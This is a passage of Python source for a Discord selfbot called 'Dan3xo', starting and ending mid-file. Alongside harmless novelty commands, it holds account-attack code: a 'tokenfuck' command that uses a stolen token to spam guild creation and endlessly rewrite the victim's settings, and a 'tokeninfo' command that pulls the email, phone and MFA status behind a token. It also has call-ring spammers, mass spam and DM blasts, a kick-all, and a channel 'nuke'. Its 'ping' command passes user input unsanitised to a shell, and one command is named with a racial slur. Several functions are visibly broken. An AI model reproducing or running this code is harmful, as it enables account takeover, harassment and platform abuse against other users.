        embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
        print('\033[97mCommand Used |\033[31m serverinfo')
        await ctx.message.delete()
        await ctx.send(embed=embed)        

#Dan3xo user Info Embed
@Dan3xo.command(pass_context=True)
async def paypal(beaters, amount):
        embed = discord.Embed(title=f"***Paypal*** :heart:", color=discord.Color(int(color, 16)))
        embed.add_field(name="`Email:`", value=f"{paypalemail}", inline=False)
        embed.add_field(name="`Amount:`", value="$"+amount, inline=False)
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/678697731786670101/707231627897733120/1Pdw2RE.png")
        embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
        print('\033[97mCommand Used |\033[31m paypal')
        await beaters.send(embed=embed)
        await beaters.message.delete()

#Dan3xo user Info Embed
@Dan3xo.command(pass_context=True)
async def cashapp(beaters, amount):
        embed = discord.Embed(title=f"***Cashapp*** :heart:", color=discord.Color(int(color, 16)))
        embed.add_field(name="`Cashtag:`", value=f"{cashapp1}", inline=False)
        embed.add_field(name="`Amount:`", value="$"+amount, inline=False)
        embed.set_thumbnail(url="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Square_Cash_app_logo.svg/1200px-Square_Cash_app_logo.svg.png")
        embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
        print('\033[97mCommand Used |\033[31m cashapp')
        await beaters.send(embed=embed)
        await beaters.message.delete()

@Dan3xo.command()
async def pingwebsite(ctx, website = None):
 print('\033[97mCommand Used |\033[31m pingwebsite')
 await ctx.message.delete()
 if website is None: 
     pass
 else:
     try:
         r = requests.get(website).status_code
     except Exception as l:
      print(f"\033[31mInvalid Website:")
      if request == 404:
         await ctx.send(f'**{website}** ``Is Offline.``')
     else:
         await ctx.send(f'**{website}** ``Is Online.``')    

@Dan3xo.command()
async def massreact(ctx, iEmoji, limit=50):
 print('\033[97mCommand Used |\033[31m massreact')
 await ctx.message.delete()
 async for msgs in ctx.channel.history(limit=limit):
     await msgs.add_reaction(iEmoji)

@Dan3xo.command()
async def react(ctx, amount: int, iEmoji):
 print('\033[97mCommand Used |\033[31m react')
 await ctx.message.delete()
 async for msgs in ctx.channel.history(limit=amount):
     await msgs.add_reaction(iEmoji)

#Dan3xo Read Unread Commands
@Dan3xo.command(aliases=['markasread', 'ack'])
async def read(ctx): 
    await ctx.message.delete()
    for guild in Dan3xo.guilds:
        await guild.ack()  

@Dan3xo.command()
async def mute(ctx):
    await ctx.message.delete()
    for guild in Dan3xo.guilds:
        await guild.mute()


def RandomColor(): 
    randcolor = discord.Color(random.randint(0xe62e00, 0xFFFFFF))
    return randcolor


@Dan3xo.command()
async def stream(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url="https://twitch.tv/monstercat", 
    )
    await Dan3xo.change_presence(activity=stream)


@Dan3xo.command()
async def clock(ctx):
  now = datetime.now()
  current_time = now.strftime("%I:%M %p")
  await Dan3xo.change_presence(
      activity=discord.Activity(
          type=discord.ActivityType.listening, 
          name=current_time, 
      ))
 
  await asyncio.sleep(1.5)
  Dan3xo.loop.create_task(clock(ctx))



#Dan3xo Rainbow Role
rainbowbruh = 0
@Dan3xo.command(aliases=['rainbow-role'])
async def rainbow(ctx, *, role):
 print('\033[97mCommand Used |\033[31m rainbow')
 await ctx.message.delete()
 global rainbowbruh
 role = discord.utils.get(ctx.guild.roles, name=role)
 if rainbowbruh == 0:
     rainbowbruh += 1
     await ctx.send("``Rainbow Role On``", delete_after=3)
     while rainbowbruh == 1:
         try:
             await role.edit(role=role, colour=RandomColor())
             await asyncio.sleep(1.5)
         except:
             break
 elif rainbowbruh == 1:
     rainbowbruh -= 1
     await ctx.send("``Rainbow Role Off``", delete_after=3) 

@Dan3xo.command()
async def stoprainbow(ctx, *, role):
 role = discord.utils.get(ctx.guild.roles, name=role)
 await ctx.message.delete()
 await role.edit(role=role, colour=discord.Colour(0xffff00))  
 await asyncio.sleep(1)

@Dan3xo.command() 
async def allowleave(self, message):
    print('\033[97mCommand Used |\033[31m remove')
    for _ in config['database']['add']:
        if(str(_) == str(self.message.mentions[0].id)):
            config['database']['add'].remove(self.message.mentions[0].id) 
            await self.message.edit(content="%s Was Removed." 
                %(self.message.mentions[0].name))
            return
    await self.message.edit(content="%s Wasnt On List." 
        %(self.message.mentions[0].name))

@Dan3xo.command() 
async def noleave(self, message):
    print('\033[97mCommand Used |\033[31m keep')
    for _ in config['database']['add']:
        if(str(_) == str(self.message.mentions[0].id)):
            await self.message.edit(content="%s Is Already On List." 
                %(self.message.mentions[0].name))
            return
    config['database']['add'].append(self.message.mentions[0].id)
    await self.message.edit(content="%s Was Added." 
        %(self.message.mentions[0].name))     

#Dan3xo Bitcoin Worth
@Dan3xo.command(aliases=['bitcoin'])
async def btc(ctx): 
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    print('\033[97mCommand Used |\033[31m btc')
    await ctx.message.delete()
    await ctx.send(embed=em)  



@Dan3xo.command()
async def ping(ctx, ip):
  await ctx.message.delete()
  print('\033[97mCommand Used |\033[31m ping')
  pingR = subprocess.getoutput("ping "+ip)
  pingP = pingR.split("\n")
  ping2 = (pingP[2])
  ping3 = (pingP[3])
  ping4 = (pingP[4])
  ping5 = (pingP[5])
  embed = discord.Embed(title=f"***Ping {ip}***", description=f"{ping2}\n{ping3}\n{ping4}\n{ping5}", color=discord.Color(int(color, 16)))
  embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
  await ctx.send(embed=embed)

@Dan3xo.command()
async def trumptweet(ctx, *, message: str):
 print('\033[97mCommand Used |\033[31m trumptweet')
 await ctx.message.delete()
 async with aiohttp.ClientSession() as cs:
     async with cs.get(f"https://nekobot.xyz/api/imagegen?type=trumptweet&text={message}") as r:
         res = await r.json()
         em = discord.Embed()
         em.set_image(url=res["message"])
         await ctx.send(embed=em)

@Dan3xo.command()
async def poll(ctx, *, question: str):
 print('\033[97mCommand Used |\033[31m poll')
 author = ctx.author.name.replace('_', '\_').replace('~', '\~').replace('|', '\|').replace('*', '\*')
 message = "**{}**".format( question)
 embed = discord.Embed(title='Poll', color=discord.Color(int(color, 16)))
 embed.timestamp = datetime.utcnow()
 embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
 embed.add_field(name="**Question:**", value="" +message)
 msg = await ctx.channel.send(embed=embed)
 try:
     await ctx.message.delete()
 except:
     pass
 check_mark = "✅"
 x_mark = "❌"
 await msg.add_reaction(check_mark)
 await msg.add_reaction(x_mark)

@Dan3xo.command(aliases=['yt'])
async def youtubesearchbro(ctx, *, search):
    await ctx.message.delete()
    query_string = urllib.parse.urlencode({
            'search_query': search
        })
    htm_content = urllib.request.urlopen(
            'http://www.youtube.com/results?' + query_string
        )
    search_results = re.findall('href=\"\\/watch\\?v=(.{11})', htm_content.read().decode())
    await ctx.send('http://www.youtube.com/watch?v=' + search_results[0])
    await ctx.send('http://www.youtube.com/watch?v=' + search_results[2])
    await ctx.send('http://www.youtube.com/watch?v=' + search_results[4])

#Dan3xo Token Disabler
@Dan3xo.command()
async def tokendisable(ctx, daddyDan3xo):
    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers=Self.headers, json={'date_of_birth': '2017-2-11'})
    if r.status_code == 400:
     print('\033[97mCommand Used |\033[31m tokendisable')
    await ctx.message.delete()
    await ctx.send(f"Account Was Successfully Disabled!")

@Dan3xo.command(aliases=['tokenfucker', 'disable', 'crash']) 
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "Dan3xo",
        'region': "europe"
    } 
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        except Exception as e:
            print(f"[ERROR]: \033[31m{e}")
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(re.LOCALE),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
            except Exception as e:
                print(f"[ERROR]: \033[31m{e}")
            else:
                break   

#Dan3xo Hypesquad Changer
@Dan3xo.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house):
 print('\033[97mCommand Used |\033[31m tokendisable')
 await ctx.message.delete()
 request = requests.Session()
 headers = {
   'Authorization': token,
   'Content-Type': 'application/json',
   'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
 }    
 if house == "bravery":
   payload = {'house_id': 1}
 elif house == "brilliance":
   payload = {'house_id': 2}
 elif house == "balance":
   payload = {'house_id': 3}
 elif house == "random":
     houses = [1, 2, 3]
     payload = {'house_id': random.choice(houses)}
 try:
     request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
 except Exception as e:
     print(f"[ERROR]:")  


#Dan3xo Message        
@Dan3xo.command()
async def spam(ctx, amount: int, *, message): 
 print('\033[97mCommand Used |\033[31m spam')
 await ctx.message.delete()    
 for _i in range(amount):
     await ctx.send(message)

@Dan3xo.command()
async def massspam(ctx, message):
 print('\033[97mCommand Used |\033[31m massspam')
 await ctx.message.delete()
 for _i in range(200):
    await ctx.send(message)



@Dan3xo.command()
async def reboot(ctx):
 python = sys.executable
 os.execl(python, python, *sys.argv)
 ctx.send('rebooted')
 print('\033[97mCommand Used |\033[31m reboot')

#Dan3xo Clean Messages Command
@Dan3xo.command()
async def clearall(ctx): 
 print('\033[97mCommand Used |\033[31m clearall')
 await ctx.message.delete()
 async for message in ctx.message.channel.history(limit=99999).filter(lambda m: m.author == Dan3xo.user).map(lambda m: m):
     try:
        await message.delete()
     except:
         pass

#Dan3xo Clear Messages Command
@Dan3xo.command()
async def clear(ctx, amount: int): 
 print('\033[97mCommand Used |\033[31m clear')
 await ctx.message.delete()
 async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Dan3xo.user).map(lambda m: m):
    try:
       await message.delete()
    except:
        pass


dm_log = 0
#DM Log Toggle On And Off
@Dan3xo.command()
async def dmlogger(message):
 print('\033[97mCommand Used |\033[31m dmlogger')
 await message.message.delete()
 global dm_log
 if dm_log == 0:
     dm_log += 1
     await message.send("Dm Logger `ON`", delete_after=5)
 elif dm_log == 1:
     dm_log -= 1
     await message.send("Dm Logger `OFF`", delete_after=5)      

#Dan3xo Deleted Message Logger
@Dan3xo.event
async def on_message_delete(message):
     global dm_log
     if dm_log == 1:
        try:
            if message.guild is None and message.author != Dan3xo.user:
                embed=discord.Embed(title="", color=discord.Color(int(color, 16))) 
                embed.set_author(name="Message Deleted")
                embed.set_thumbnail(url=message.author.avatar_url)
                embed.add_field(name=f"**Name**", value=f"{message.author.mention}")
                embed.add_field(name="**Deleted Message**", value="{}".format(message.content), inline=False)
                embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
                await message.channel.send(embed=embed)
        except Exception as e:
            print(str(e))
     else:
        pass   

@Dan3xo.event
async def on_message_edit(before, after):
     global dm_log
     if dm_log == 1:
        await Dan3xo.process_commands(after)
        try:  
            if before.guild is None and before.author != Dan3xo.user:
                embed = discord.Embed(title="", color=discord.Color(int(color, 16))) 
                embed.set_author(name="Message Edited")
                embed.set_thumbnail(url=before.author.avatar_url)
                embed.add_field(name=f"**Name**", value=f"{before.author.mention}")
                embed.add_field(name="**Message Before**", value="{}".format(before.content), inline=False)
                embed.add_field(name="**Message After**", value="{}".format(after.content), inline=False)
                embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')
                await before.channel.send(embed=embed)
        except Exception as e:
            print(str(e))
     else:
        pass   

@Dan3xo.command()
async def leave(ctx):
    await ctx.message.delete()
    for guild in Dan3xo.guilds:
        await guild.leave()


@Dan3xo.command()
async def translate(ctx, *, message):
 print('\033[97mCommand Used |\033[31m translate')
 await ctx.message.delete()
 trans = translator.translate(message)
 embed = discord.Embed(title=f"Translate", description=f"",inline=False, color=discord.Color(int(color, 16)))
 embed.add_field(name=f"**Original Message**", value=f"{trans.origin}", inline=False)
 embed.add_field(name=f"**Translated Message**", value=f"{trans.text}", inline=False)
 embed.set_thumbnail(url="https://static.thenounproject.com/png/5735-200.png")
 embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg')   
 await ctx.send(embed=embed) 


@Dan3xo.command()
async def uptime(ctx): 
 print('\033[97mCommand Used |\033[31m uptime')
 await ctx.message.delete()
 uptime = datetime.utcnow() - start_time
 uptime = str(uptime).split('.')[0]
 await ctx.send(f'`'+uptime+'`')


afk_log = 0
#Dan3xo AFK On And Off
@Dan3xo.command()
async def afk(message):
 print('\033[97mCommand Used |\033[31m afk')
 await message.message.delete()
 global afk_log
 if afk_log == 0:
     afk_log += 1
     await message.send("AFK `ON`", delete_after=5)
     
 elif afk_log == 1:
     afk_log -= 1
     await message.send("AFK `OFF`", delete_after=5)    
      
#Dan3xo Token Info
@Dan3xo.command()
async def tokeninfo(ctx, _token):
 print('\033[97mCommand Used |\033[31m tokeninfo')
 await ctx.message.delete()
 headers = {
     'Authorization': _token,
     'Content-Type': 'application/json'
 }      
 try:
     res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
     res = res.json()
     user_id = res['id']
     locale = res['locale']
     avatar_id = res['avatar']
     creation_date = datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
 except KeyError:
     print(f"[ERROR]: Invalid token")
 em = discord.Embed(
     description=f"ID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
 fields = [
     {'name': 'Phone', 'value': res['phone']},
     {'name': 'Flags', 'value': res['flags']},
     {'name': 'MFA?', 'value': res['mfa_enabled']},
     {'name': 'Verified?', 'value': res['verified']},
 ]
 for field in fields:
     if field['value']:
         em.add_field(name=field['name'], value=field['value'], inline=False)
         em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
 return await ctx.send(embed=em)  


#Dan3xo DDOS Command lel
@Dan3xo.command()
async def boot(ctx):
 print('\033[97mCommand Used |\033[31m boot')
 await ctx.message.edit(content="Zac")
 time.sleep(1)
 await ctx.message.edit(content="Is Straight")
 time.sleep(1)
 await ctx.message.edit(content="Ass At")
 time.sleep(1)
 await ctx.message.edit(content="2k")
 time.sleep(1)

tiny_table = str.maketrans(string.ascii_lowercase, 'ᵃᵇᶜᵈᵉᶠᵍʰⁱʲᵏˡᵐⁿᵒᵖ٩ʳˢᵗᵘᵛʷˣʸᶻ')
@Dan3xo.command(aliases=['tinyfont', 'small', 'smallfont'])
async def tiny(ctx, *, text: str = None):
 print('\033[97mCommand Used |\033[31m tiny')
 if text is None:
     return await ctx.error('Please provide text to convert!')
 await ctx.message.edit(content=text.lower().translate(tiny_table))




def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)
        return inner
    return outer

@async_executor()
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower())
    tts.write_to_fp(f)
    f.seek(0)
    return f
@Dan3xo.command()
async def tts(ctx, *, message):
 print('\033[97mCommand Used |\033[31m tts')
 await ctx.message.delete()
 buff = await do_tts(message)
 await ctx.send(file=discord.File(buff, f"{message}.wav"))

#Dan3xo Magic 8 Ball Command
@Dan3xo.command()
async def magic8ball(ctx, *, question):
 print('\033[97mCommand Used |\033[31m magic8ball')
 await ctx.message.delete()
 responses = [
   'That is a resounding no',
   'It is not looking likely',
   'Too hard to tell',
   'It is quite possible',
   'That is a definite yes!',
   'Maybe',
   'There is a good chance'
 ]
 answer = random.choice(responses)
 embed = discord.Embed()
 embed.add_field(name="Question", value=question, inline=False,)
 embed.add_field(name="Answer", value=answer, inline=False, color=discord.Color(int(color, 16)))
 embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
 embed.set_footer(text=f"{name}", icon_url=f'https://cdn.discordapp.com/attachments/737510848628654092/737889925231280188/image0.jpg') 
 await ctx.send(embed=embed)

@Dan3xo.command(name='get-hwid', aliases=['hwid', 'gethwid', 'hwidget'])
async def hwid(ctx): 
    await ctx.message.delete()
    print(f"HWID: {hwid}")

@Dan3xo.command()
async def emojify(ctx, *, msg):
    try:
        await ctx.message.delete()
    except discord.Forbidden:
        pass
    if msg != None:
        out = msg.lower()
        text = out.replace(' ', '    ').replace('10', '\u200B:keycap_ten:')\
                  .replace('ab', '\u200B🆎').replace('cl', '\u200B🆑')\
                  .replace('0', '\u200B:zero:').replace('1', '\u200B:one:')\
                  .replace('2', '\u200B:two:').replace('3', '\u200B:three:')\
                  .replace('4', '\u200B:four:').replace('5', '\u200B:five:')\
                  .replace('6', '\u200B:six:').replace('7', '\u200B:seven:')\
                  .replace('8', '\u200B:eight:').replace('9', '\u200B:nine:')\
                  .replace('!', '\u200B❗').replace('?', '\u200B❓')\
                  .replace('vs', '\u200B🆚').replace('.', '\u200B🔸')\
                  .replace(',', '🔻').replace('a', '\u200B🅰')\
                  .replace('b', '\u200B🅱').replace('c', '\u200B🇨')\
                  .replace('d', '\u200B🇩').replace('e', '\u200B🇪')\
                  .replace('f', '\u200B🇫').replace('g', '\u200B🇬')\
                  .replace('h', '\u200B🇭').replace('i', '\u200B🇮')\
                  .replace('j', '\u200B🇯').replace('k', '\u200B🇰')\
                  .replace('l', '\u200B🇱').replace('m', '\u200B🇲')\
                  .replace('n', '\u200B🇳').replace('ñ', '\u200B🇳')\
                  .replace('o', '\u200B🅾').replace('p', '\u200B🅿')\
                  .replace('q', '\u200B🇶').replace('r', '\u200B🇷')\
                  .replace('s', '\u200B🇸').replace('t', '\u200B🇹')\
                  .replace('u', '\u200B🇺').replace('v', '\u200B🇻')\
                  .replace('w', '\u200B🇼').replace('x', '\u200B🇽')\
                  .replace('y', '\u200B🇾').replace('z', '\u200B🇿')
        try:
            await ctx.send(text)
        except Exception as e:
            await ctx.send(f'```{e}```')

            
#Dan3xo Combine Name Command
@Dan3xo.command()
async def combine(ctx, name1, name2):
 print('\033[97mCommand Used |\033[31m combine')
 await ctx.message.delete()
 name1letters = name1[:round(len(name1) / 2)]
 name2letters = name2[round(len(name2) / 2):]
 ship = "".join([name1letters, name2letters])
 embed = (discord.Embed(description=f"{ship}",color=discord.Color(int(color, 16))))
 embed.set_author(name=f"{name1} + {name2}")
 await ctx.send(embed=embed) 

#Dan3xo Ban Everyone  
@Dan3xo.command()
async def nigger(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await ctx.mention.user()
        except:
            pass  

@Dan3xo.command()
async def pingall(ctx):
 print('\033[97mCommand Used |\033[31m dmall')
 await ctx.message.delete()
 for user in list(ctx.guild.members):
  try:
   await ctx.send(f'{user.mention}', delete_after=0.1)
  except:
      pass 


#Dan3xo DM All Command
@Dan3xo.command()
async def dmall(ctx, *, message):
 print('\033[97mCommand Used |\033[31m dmall')
 await ctx.message.delete()
 for user in list(ctx.guild.members):
     try:
         await asyncio.sleep(5)    
         await user.send(message)
     except:
         pass       

@Dan3xo.command()
async def advertise(ctx, *, message):
 print('\033[97mCommand Used |\033[31m dmall')
 await ctx.message.delete()
 for user in list(ctx.guild.members):
     try:
         await asyncio.sleep(120)    
         await user.send(message)
     except:
         pass  



#Dan3xo DM Command
@Dan3xo.command()
async def massdm(ctx, *, message: str):
 await ctx.message.delete()
 for user in ctx.guild.members:
     try:
         await ctx.send(user, contents)
     except:
         pass


#Dan3xo Kick All
@Dan3xo.command()
async def kickall(ctx):
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass    
               
   
#Dan3xo Call Spammer
@Dan3xo.command()
async def phone(ctx):
 print('\033[97mCommand Used |\033[31m phone')
 await ctx.message.delete()
 headers = {
 'authorization': token,
 'referer': 'https://discordapp.com/channels/@me/'+str(ctx.message.channel.id),
 'origin': 'https://discordapp.com/',
 'accept-encoding': 'gzip, deflate, br'
 }
 url = 'https://discordapp.com/api/v6/channels/'+str(ctx.message.channel.id)+'/call/ring'
 payload = {'recipients': 0}
 t_end = time.time() + 10
 while time.time() < t_end:
      r = requests.post(url, headers=headers, json=payload)
      if r.status_code != 204:
          print('[#] Being ratelimited, applying 100ms latency')
          time.sleep(0.1)
      time.sleep(0.3)

@Dan3xo.command()
async def cbomb(ctx):
    await ctx.message.delete()
    latency = 0
    choices = ['brazil','europe','frankfurt','hong-kong','india','japan','russia','singapore','south-africa','sydney','us-central','us-east','us-south','us-west', 'amsterdam']
    headers = {
    'authorization': token,
    'referer': 'https://discordapp.com/channels/@me/'+str(ctx.message.channel.id),
    'accept-encoding': 'gzip, deflate, br',
    'origin': 'https://discordapp.com/'
    }
    url = 'https://discordapp.com/api/v6/channels/'+str(ctx.message.channel.id)+'/call'
    t_end = time.time() + 10
    while time.time() < t_end:
        x = random.choice(choices)
        payload = {'region': x}
        r = requests.patch(url, headers=headers, json=payload)
        if r.status_code != 204:
            print("[#] Being ratelimited, applying 100ms latency")
            latency += 0.1
            time.sleep(latency)
        time.sleep(latency)

#Dan3xo Get user Avatar
@Dan3xo.command()
async def av(ctx, *, user: discord.Member=None): 
 print('\033[97mCommand Used |\033[31m av')
 await ctx.message.delete()
 format = "gif"
 user = user or ctx.author
 if user.is_avatar_animated() != True:
  format = "png"
 avatar = user.avatar_url_as(format = format if format != "gif" else None)
 async with aiohttp.ClientSession() as session:
     async with session.get(str(avatar)) as resp:
         image = await resp.read()
 with io.BytesIO(image) as file:
     await ctx.send(file = discord.File(file, f"Avatar.{format}"))             


#Dan3xo Text To Acscii Command
@Dan3xo.command()
async def ascii(ctx, *, text):
 print('\033[97mCommand Used |\033[31m ascii')
 await ctx.message.delete()
 r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
 if len('```'+r+'```') > 2000:
     return
 await ctx.send(f"```{r}```")



#Dan3xo Groupchat Leaver
@Dan3xo.command()
async def groupleaver(ctx):
 print('\033[97mCommand Used |\033[31m groupleaver')
 await ctx.message.delete()
 for channel in Dan3xo.private_channels:
     if isinstance(channel, discord.GroupChannel):
         await channel.leave()    

# Dan3xo Toxic Ass Spam Thingy Bruh LMFAOO
@Dan3xo.command(pass_context=True)
async def toxic(beaters): #this bitch is toxic -Dan3xo
 print('\033[97mCommand Used |\033[31m toxic')
 await beaters.message.delete()
 await beaters.send('ﾠﾠ'+'\n' * 1000 + 'ﾠﾠ')
    
#Dan3xo Slot Machine
@Dan3xo.command(aliases=['slots', 'bet'])
async def slot(ctx): 
 print('\033[97mCommand Used |\033[31m slot')
 await ctx.message.delete()
 emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
 a = random.choice(emojis)
 b = random.choice(emojis)
 c = random.choice(emojis)
 slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
 if (a == b == c):
     await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} All matchings, you won!"}))
 elif (a == b) or (a == c) or (b == c):
     await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} 2 in a row, you won!"}))
 else:
     await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} No match, you lost"}))    

    #Dan3xo Loves You Text
@Dan3xo.command(pass_context=True)
async def love(beaters):
    await beaters.send("\n".join(["```yaml",

" ____             _   ______",
"|  _ \           | | |___  /",
"| |_) | ___  __ _| |_   / / ",
"|  _ < / _ \/ _` | __| / /  ",
"| |_) |  __/ (_| | |_ / /__ ",
"|____/ \___|\__,_|\__/_____|",
" _                          ",
"| |                         ",
"| |     _____   _____  ___  ",
"| |    / _ \ \ / / _ \/ __| ",
"| |___| (_) \ V /  __/\__ \ ",
"|______\___/ \_/ \___||___/ ",
"__     __          ",
"\ \   / /          ",
" \ \_/ /__  _   _  ",
"  \   / _ \| | | | ",
"   | | (_) | |_| | ",
"   |_|\___/ \__,_| ",     
"```"]))
    await beaters.message.delete()

#Dan3xo Joke Embed
@Dan3xo.command()
async def joke(ctx):  
 print('\033[97mCommand Used |\033[31m joke')
 await ctx.message.delete()
 headers = {
     "Accept": "application/json"
 }
 async with aiohttp.ClientSession()as session:
     async with session.get("https://icanhazdadjoke.com", headers=headers) as req:
         r = await req.json()
 await ctx.send(r["joke"])    

@Dan3xo.command()
async def nuke(ctx):
 print('\033[97mCommand Used |\033[31m nuke')
 await ctx.message.delete()
 guild = ctx.message.author.guild
 channel = ctx.message.channel
 position = channel.position
 category = channel.category
 name = channel.name
 try:
     newchannel = await channel.clone(name=None, reason=None)
     await channel.delete()
     await newchannel.send(f"{ctx.message.author.mention} Has **NUKED** The Channel\nhttps://media.giphy.com/media/3oKIPwoeGErMmaI43S/giphy.gif")
 except Exception as e:
     print(e)

@Dan3xo.command()
async def kick(ctx, member : discord.Member, *, reason=None):
 print('\033[97mCommand Used |\033[31m kick')
 await ctx.message.delete()
 ment = member.mention
 embed = discord.Embed(title="Kick",description=f"{member.mention} Was kicked by "f"{ctx.author.mention} For the reason: "+reason+ "", color=discord.Color(int(color, 16)))
 embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg') 
 await member.kick(reason=reason)
 await ctx.send(embed=embed)

@kick.error
async def kick_error(ctx, error):
    print(f"{ctx.message.author.mention}, You Dont Have Perms!")

@Dan3xo.command()
async def ban(ctx, member : discord.Member, *, reason=None):
 print('\033[97mCommand Used |\033[31m ban')
 await ctx.message.delete()
 ment = member.mention
 embed = discord.Embed(title="Ban",description=f"{member.mention} Was Banned by "f"{ctx.author.mention} For the reason: "+reason+ "", color=discord.Color(int(color, 16)))
 embed.set_footer(text=f"{name}", icon_url=f'https://cdn.discordapp.com/attachments/737510848628654092/737889925231280188/image0.jpg') 
 await member.ban(reason=reason)
 await ctx.send(embed=embed)

@ban.error
async def ban_error(ctx, error):
    print(f"{ctx.message.author.mention}, You Dont Have Perms!")

@Dan3xo.command()
async def unban(ctx, *, member):
    await ctx.message.delete()
    if ctx.message.author.guild_permissions.ban_members:
        banned_users = await ctx.guild.bans()
        member_name, member_discriminator = member.split("#")
        for ban_entry in banned_users:
            user = ban_entry.user
            if (user.name, user.discriminator) == (member_name, member_discriminator):
                await ctx.guild.unban(user)
                embed = discord.Embed(title="Unban ",description=f"{user.mention} Was ubanned by "f"{ctx.author.mention}", color=discord.Color(int(color, 16)))
                embed.set_footer(text=f"{name}", icon_url=f'https://media.discordapp.net/attachments/911457101522534430/918980030552481842/3424a56c44c988dd57b3f0e9867c7793.jpg') 
                await ctx.send(embed=embed)
        return

@Dan3xo.command()
async def purge(ctx, amount=10):
  await ctx.message.delete()
  await ctx.channel.purge(limit=amount)
  responseMsg = discord.Embed(title=f"Cleared {amount} messages!", color=discord.Color(int(color, 16)))
  responseMsg.timestamp = datetime.utcnow()
  response = await ctx.send(embed=responseMsg, delete_after=5)

#Dan3xo Blocking Out Dumbass Errors In CMD
@Dan3xo.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"[ERROR]: You Need Perms For This")
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"[ERROR]: Not A Valid Command")
    elif isinstance(error, discord.errors.Forbidden):
        print(f"[ERROR]: Discord error: {error}")
    elif "Cannot send an empty message" in error_str:
        print(f"[ERROR]: Couldnt send a empty message")
    elif "Unknown Message" in error_str:
        pass       
    else:
        print(f"[ERROR]: {error_str}")   

#Dan3xo AFK Message
@Dan3xo.event                
async def on_message(message):
  await Dan3xo.process_commands(message)
  regex = r"(discord.kisst)\/\w{16,24}"
